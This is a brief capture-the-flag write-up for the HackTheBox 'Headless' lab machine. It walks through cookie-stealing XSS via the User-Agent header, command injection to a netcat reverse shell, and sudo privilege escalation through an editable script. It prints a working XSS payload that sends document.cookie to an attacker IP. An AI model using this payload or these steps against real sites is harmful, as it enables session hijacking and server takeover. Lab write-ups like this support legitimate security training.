---
title: "HackTheBox session, Headless(easy)"
date: "01.07.2024"
---

## Discovery
Found two open ports: 22 and 5000, where 5000 was a website.

## Enumeration
Found only two directories: /support(200) and /dashboard(401 Unauthorized).

## Poking around
When looking at requests in Burpsuite, I found that the Cookie parameter contained Base64 description of the user type, followed by an authentication token. This turned out to be useful later.

##  Exploiting XSS
Attempting xss on a form in /support resulted in a hack attempt warning. This warning read the HTTP headers from the sent request directly, which, ironically, was vulnerable to XSS.
I set my User-Agent as follows:  
```User-Agent: </div><script> fetch('http://10.10.14.34:8000/?c=' + btoa(document.cookie));</script><div class="container">```  
By using fetch() I got the host to send a request to my python server, where the hosts cookie was included, giving me a admin session token.

## Gaining initial access
Using the retrieved session token, I gained access to the /dashboard, which didn't have a lot of functionality.
I did some poking using BurpSuite, and found that appending linux commands on the data sent, allowed me to execute commands on the server.
Using this, I set up a netcat listener and get a reverse shell on the server. I then found the flag by searching for user.txt using the find command.


## Privilege Escalation
Running sudo -l I found a single file that could be run as root without password: ```/usr/bin/syscheck```  
Analysing this file, I found that it ran a shell file called ```initdb.sh```, which I could edit. I therefore modified this file to include a reverse shell, and ran the ```syscheck``` file as root.  
The last step was to find the root flag, which I found by again using the find command.

[Machine link](https://app.hackthebox.com/machines/Headless)